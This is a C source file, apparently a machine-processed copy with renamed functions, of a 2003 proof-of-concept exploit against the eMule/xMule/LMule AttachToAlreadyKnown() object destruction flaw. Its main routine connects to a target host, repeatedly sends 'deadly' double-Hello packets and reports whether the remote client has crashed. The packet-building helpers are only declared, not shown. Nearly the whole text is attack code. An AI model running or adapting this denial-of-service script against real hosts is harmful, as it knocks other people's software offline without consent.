#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int MAXTRIES ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ ,char*,char const*) ; 
 int /*<<< orphan*/  FUNC2 (char const*) ; 
 int /*<<< orphan*/  FUNC3 (char*) ; 
 int /*<<< orphan*/  FUNC4 (char*,...) ; 
 int /*<<< orphan*/  FUNC5 (char*) ; 
 scalar_t__ FUNC6 (int) ; 
 scalar_t__ FUNC7 (int) ; 
 int FUNC8 (char const*,char const*) ; 
 int /*<<< orphan*/  stderr ; 
 int FUNC9 (char*) ; 

int
FUNC10 (int argc, char *argv[])
{
	FUNC5 ("eMule/xMule/LMule AttachToAlreadyKnown() "
			"Object Destruction vulnerability\n"
		"proof of concept code\n"
		"Copyright (C) 2003 Rï¿½mi Denis-Courmont "
			"<exploit@simutrans.fr.st>\n");
	if (argc < 2)
		return FUNC9 (argv[0]);
	else
	{
		int fd, count = 0;
		const char *host, *port;

		host = argv[1];
		port = (argc < 3) ? "4662" : argv[2];
		FUNC4 ("Connecting to [%s]:%s ...\n", host, port);
		while (++count && ((fd = FUNC8 (host, port)) != -1))
		{
			FUNC4 ("Sending double-Hello packet (%d)...\n",
					count);
			if (FUNC7 (fd))
			{
				FUNC3 ("Error");
				count = -1;
			}

			FUNC5 ("Checking reply ...");
			if (FUNC6 (fd))
			{
				FUNC1 (stderr, "%s: malformed reply\n",
						host);
				count = -1;
			}
			else if (FUNC6 (fd))
				FUNC4 ("%s might be vulnerable.\n", host);
			else
			{
				FUNC4 ("%s is not vulnerable.\n", host);
				count = -1;
			}
			FUNC0 (fd);

			if (count >= MAXTRIES)
			{
				FUNC4 ("%s is still alive after %d deadly "
					"packets. Probably not vulnerable.\n",
					host, count);
				return 0;
			}
		}

		FUNC2 (host);
		if (count)
		{
			FUNC5 ("Remote host seems to have crashed!");
			return 0;
		}
	}

	return 1;
}